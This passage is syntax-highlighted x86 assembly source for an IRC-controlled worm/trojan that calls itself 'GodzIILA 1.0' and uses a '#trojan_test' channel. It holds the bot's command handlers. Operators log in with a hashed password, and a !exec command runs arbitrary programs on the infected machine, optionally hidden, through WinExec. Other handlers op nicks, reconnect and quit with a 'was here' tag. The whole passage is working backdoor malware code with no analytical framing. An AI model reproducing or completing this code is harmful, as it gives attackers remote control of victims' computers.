            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_privmsg</span><span class="sc0">
</span><span class="sc5">err_bot_info</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; ispisuje verziju crva</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_version</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GodzIILA</span><span class="sc0"> </span><span class="sc2">1.0</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_privmsg</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; executes given program. format:</span><span class="sc0">
</span><span class="sc1">; !exec "&lt;progname&gt;" &lt;flagz&gt;</span><span class="sc0">
</span><span class="sc1">; &lt;progname&gt;     - PATH to proggy name</span><span class="sc0">
</span><span class="sc1">; &lt;flagz&gt;        - window appearance</span><span class="sc0">
</span><span class="sc1">;                -h    - hidden</span><span class="sc0">
</span><span class="sc1">;                -d    - normal (default)</span><span class="sc0">
</span><span class="sc1">;                -x    - maximyzed</span><span class="sc0">
</span><span class="sc1">;                -n    - minimyzed</span><span class="sc0">
</span><span class="sc1">; i: internal</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; note: if &lt;flagz&gt; param iz in invalid format, -h option iz assumed</span><span class="sc0">
</span><span class="sc1">; &lt;progname&gt; must be under quotes</span><span class="sc0">
</span><span class="sc1">; ex: !exec "notepad.exe" -x</span><span class="sc0">
</span><span class="sc1">; program params must be under quotes, too</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_exec</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">@endcr</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">err_cmd_syntax</span><span class="sc0">              </span><span class="sc1">; exec "</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; ebx = ptr to CR</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">__parse_exec</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__exec_got_quote</span><span class="sc0">

            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__parse_exec</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

</span><span class="sc5">__exec_got_quote</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; edi = ptr to progname</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"d-"</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__x_1</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__1</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__s_1</span><span class="sc0">

</span><span class="sc5">__x_1</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SW_NORMAL</span><span class="sc0">
</span><span class="sc5">__s_1</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"x-"</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__x_2</span><span class="sc0">
            
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__2</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__s_2</span><span class="sc0">

</span><span class="sc5">__x_2</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SW_MAXIMIZE</span><span class="sc0">
</span><span class="sc5">__s_2</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">__3</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"n-"</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__x_3</span><span class="sc0">
            
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__3</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__s_3</span><span class="sc0">

</span><span class="sc5">__x_3</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SW_MINIMIZE</span><span class="sc0">
</span><span class="sc5">__s_3</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">WinExec</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cmd_exec_end</span><span class="sc0">

</span><span class="sc5">err_cmd_syntax</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">command</span><span class="sc0"> </span><span class="sc5">syntax</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">20</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_privmsg</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
</span><span class="sc5">cmd_exec_end</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; ops a specified nick</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_opme</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">MODE</span><span class="sc0"> #</span><span class="sc5">trojan_test</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc5">o</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_cmd_nick</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endsz</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_cmd_nick</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CRLF_HEX</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; reconnects to irc server</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_reconnect</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">connect_to_irc</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; QUITs a irc server</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_quit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">QUIT</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc5">GodzIILa</span><span class="sc0"> </span><span class="sc5">was</span><span class="sc0"> </span><span class="sc5">here</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">23</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">irc_send_crlf</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
    
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; removes a nick from op list</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_logout</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_cmd_nick</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endsz</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operators</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_cmd_nick</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
    
</span><span class="sc5">__oplook</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">oper_found</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">operator</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_cmd_nick</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">err_not_logged_in</span><span class="sc0">           </span><span class="sc1">; in case that nobody is logged in so eax = 0</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__oplook</span><span class="sc0">

</span><span class="sc5">err_not_logged_in</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">Error</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Nick</span><span class="sc0"> </span><span class="sc5">isn</span><span class="sc13">'t logged in.&gt;
</span><span class="sc0">            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">28</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_privmsg</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bot_logout_end</span><span class="sc0">

</span><span class="sc5">oper_found</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">19</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">operators</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Nick</span><span class="sc0"> </span><span class="sc5">has</span><span class="sc0"> </span><span class="sc5">been</span><span class="sc0"> </span><span class="sc5">logged</span><span class="sc0"> </span><span class="sc5">out.</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">25</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_privmsg</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
            
</span><span class="sc5">bot_logout_end</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; logs a nick into op list</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_login</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                  </span><span class="sc1">; start hash calculation algo</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">                       </span><span class="sc1">; next lettter</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">CR</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cycle</span><span class="sc0">                 </span><span class="sc1">; loop until CR</span><span class="sc0">
    
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bot_password</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__wrong_password</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">operators</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">            </span><span class="sc1">; op numba overflow?</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_OPERZ_ALLOWED</span><span class="sc0">
            </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">__too_much_ops</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__already_logged_in</span><span class="sc0">

